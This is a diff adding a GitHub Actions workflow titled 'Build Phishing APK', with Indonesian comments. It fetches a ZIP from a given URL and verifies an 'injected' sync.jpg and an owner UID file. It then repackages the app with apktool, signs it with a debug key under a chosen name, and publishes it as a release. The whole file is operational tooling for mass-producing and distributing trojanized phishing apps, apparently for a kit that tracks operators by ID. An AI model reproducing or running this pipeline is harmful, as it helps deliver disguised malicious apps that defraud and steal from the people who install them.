@@ -1,0 +1,170 @@
+name: Build Phishing APK
+
+on:
+  workflow_dispatch:
+    inputs:
+      zip_url:
+        description: 'URL ZIP dari GitHub Release'
+        required: true
+        type: string
+      app_name:
+        description: 'Nama APK yang di-inject'
+        required: true
+        type: string
+      build_tag:
+        description: 'Build Tag (ID unik)'
+        required: true
+        type: string
+      owner_uid:
+        description: 'Owner UID (info)'
+        required: false
+        type: string
+
+jobs:
+  build-apk:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Setup Java 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Install System Tools
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq apktool zipalign wget unzip
+
+      - name: Show Build Info
+        run: |
+          echo "════════════════════════════════════════"
+          echo "  BUILD TAG  : ${{ github.event.inputs.build_tag }}"
+          echo "  APP NAME   : ${{ github.event.inputs.app_name }}"
+          echo "  OWNER UID  : ${{ github.event.inputs.owner_uid }}"
+          echo "  ZIP URL    : ${{ github.event.inputs.zip_url }}"
+          echo "════════════════════════════════════════"
+
+      - name: Download Source ZIP
+        run: |
+          mkdir -p source
+          wget -q -O source.zip "${{ github.event.inputs.zip_url }}"
+          unzip -q source.zip -d source/
+          echo "── Isi source/ ──"
+          ls -la source/ | head -20
+
+      - name: Verify Injection
+        run: |
+          echo "── Cek sync.jpg ──"
+          if [ -f "source/sync.jpg" ]; then
+            SIZE=$(stat -c%s source/sync.jpg)
+            echo "✓ sync.jpg found (${SIZE} bytes)"
+          else
+            echo "✗ sync.jpg NOT FOUND"
+            exit 1
+          fi
+
+          echo "── Cek assets/uid.json ──"
+          if [ -f "source/assets/uid.json" ]; then
+            echo "✓ assets/uid.json found:"
+            cat source/assets/uid.json
+          else
+            echo "✗ assets/uid.json NOT FOUND"
+            exit 1
+          fi
+
+          echo "── Cek AndroidManifest.xml ──"
+          if [ -f "source/AndroidManifest.xml" ]; then
+            echo "✓ AndroidManifest.xml found"
+          else
+            echo "✗ AndroidManifest.xml NOT FOUND"
+            exit 1
+          fi
+
+      - name: Build APK (apktool)
+        run: |
+          cd source
+          if [ -f "apktool.yml" ]; then
+            echo "── apktool.yml found, building with apktool ──"
+            apktool b -o ../unsigned.apk
+          else
+            APK_FILE=$(find . -maxdepth 1 -name "*.apk" | head -1)
+            if [ -z "$APK_FILE" ]; then
+              echo "ERROR: Tidak ada apktool.yml atau *.apk di source/"
+              exit 1
+            fi
+            echo "── Found existing APK: $APK_FILE ──"
+            cp "$APK_FILE" ../unsigned.apk
+          fi
+          cd ..
+          ls -la unsigned.apk
+
+      - name: Generate Debug Keystore
+        run: |
+          keytool -genkeypair -v \
+            -keystore debug.keystore \
+            -storepass android \
+            -alias androiddebugkey \
+            -keypass android \
+            -keyalg RSA \
+            -keysize 2048 \
+            -validity 10000 \
+            -dname "CN=Android Debug,O=Android,C=US" 2>&1 | tail -3
+
+      - name: Zipalign APK
+        run: |
+          BUILD_TOOLS=$(ls -d $ANDROID_HOME/build-tools/* | sort -V | tail -1)
+          echo "Using build-tools: $BUILD_TOOLS"
+          $BUILD_TOOLS/zipalign -v 4 unsigned.apk aligned.apk
+          ls -la aligned.apk
+
+      - name: Sign APK
+        run: |
+          BUILD_TOOLS=$(ls -d $ANDROID_HOME/build-tools/* | sort -V | tail -1)
+          SAFE_NAME=$(echo "${{ github.event.inputs.app_name }}" | tr -cd 'A-Za-z0-9_-')
+          [ -z "$SAFE_NAME" ] && SAFE_NAME="app"
+          OUTPUT_NAME="${SAFE_NAME}.apk"
+
+          echo "── Signing to: $OUTPUT_NAME ──"
+          $BUILD_TOOLS/apksigner sign \
+            --ks debug.keystore \
+            --ks-pass pass:android \
+            --key-pass pass:android \
+            --out "$OUTPUT_NAME" \
+            aligned.apk
+
+          echo "── Verify signature ──"
+          $BUILD_TOOLS/apksigner verify -v "$OUTPUT_NAME"
+
+          echo "OUTPUT_APK=$OUTPUT_NAME" >> $GITHUB_ENV
+          ls -la "$OUTPUT_NAME"
+
+      - name: Upload APK to Release
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          TAG="${{ github.event.inputs.build_tag }}"
+          echo "── Uploading $OUTPUT_APK to release tag: $TAG ──"
+
+          if gh release view "$TAG" --repo "${{ github.repository }}" > /dev/null 2>&1; then
+            gh release upload "$TAG" "$OUTPUT_APK" --clobber --repo "${{ github.repository }}"
+            echo "✓ Uploaded to existing release"
+          else
+            gh release create "$TAG" "$OUTPUT_APK" --title "$TAG" --notes "Auto-built APK" --repo "${{ github.repository }}"
+            echo "✓ Created new release"
+          fi
+
+      - name: Done
+        run: |
+          echo "════════════════════════════════════════"
+          echo "  ✓ BUILD SUCCESS"
+          echo "  TAG: ${{ github.event.inputs.build_tag }}"
+          echo "  APK: ${{ env.OUTPUT_APK }}"
+          echo "════════════════════════════════════════"
